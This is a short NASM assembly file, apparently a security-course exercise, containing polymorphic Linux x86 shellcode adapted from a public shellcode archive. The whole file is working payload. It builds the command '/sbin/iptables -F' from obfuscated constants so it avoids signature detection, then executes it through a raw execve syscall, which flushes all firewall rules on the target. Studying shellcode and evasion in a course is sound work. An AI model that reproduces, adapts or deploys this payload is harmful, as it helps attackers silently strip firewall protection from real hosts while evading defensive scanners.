; Filename: poly_shellcode_825.nasm
; Author:  Samuel Dugo
; SLAE-ID:    SLAE-1376
; Size:       56 bytes (130%)
; Purpose: Polymorphic version of shellcode found on http://shell-storm/shellcode/files/shellcode-825.php

global _start			

section .text
_start:

    sub    eax,eax         ;similar to "xor eax,eax"
    cdq                    ;clears edx
    push   eax             ;adds null terminator
    mov    dx,0x462e
    dec    edx
    push   edx             ;pushes "-F"
    mov    esi,esp         ;saves the argument on esi
    push   eax             ;adds null terminator
    add    edx,0x73652635
    push   edx             ;pushes "bles"
    sub    edx,0x11F0FBF9
    push   edx             ;pushes "ipta"
    sub    edx,0x32060707
    push   edx             ;pushes "bin/"
    add    edx,0x43C0C5CD
    push   edx             ;pushes "///s"
    mov    ebx,esp         ;saves the command on ebx
    push   eax             ;adds null terminator
    push   esi             ;adds arguments
    push   ebx             ;adds command
    mov    ecx,esp         ;saves the whole command on ecx
    cdq                    ;clears edx
    mov    al,0xbb
    sub    al,0xb0         ;loads 0x0b for sys_execve
    int    0x80